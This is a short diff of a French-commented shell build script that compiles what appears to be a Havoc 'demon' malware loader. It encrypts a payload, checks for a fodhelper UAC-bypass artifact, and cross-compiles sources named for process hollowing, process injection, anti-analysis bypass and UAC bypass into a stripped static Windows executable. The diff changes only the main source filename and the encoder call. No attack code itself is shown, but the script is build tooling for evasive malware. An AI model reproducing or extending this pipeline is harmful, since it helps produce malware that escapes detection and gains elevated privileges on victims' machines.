@@ -19,14 +19,14 @@ ARCH="${3:-x64}"
 rm -f *.o
 echo "[*] Nettoyage: fichiers objet supprimés"
 
-python3 myenc.py -i "$INPUT_BIN" -o payload_enc.bin
+python3 myenc.py -i "$INPUT_BIN"
 grep -q "fodhelper_enc" demon.x64.h || { echo "❌ fodhelper_enc manquant"; exit 1; }
 
 CC="x86_64-w64-mingw32-g++"
 [[ "$ARCH" == "x86" ]] && CC="i686-w64-mingw32-g++"
 
 $CC -O2 -s -static -static-libgcc -static-libstdc++ \
-  havoc_loader_main.cpp easCipher42.cpp crypto_funcs.cpp process_hollower.cpp process_injection.cpp bypass_analysis.cpp uac_bypass.cpp \
+  loader.cpp easCipher42.cpp crypto_funcs.cpp process_hollower.cpp process_injection.cpp bypass_analysis.cpp uac_bypass.cpp \
   -lbcrypt -lntdll -lole32 -lwinhttp -o "$OUTPUT_EXE"
 
 strip "$OUTPUT_EXE" 2>/dev/null || true
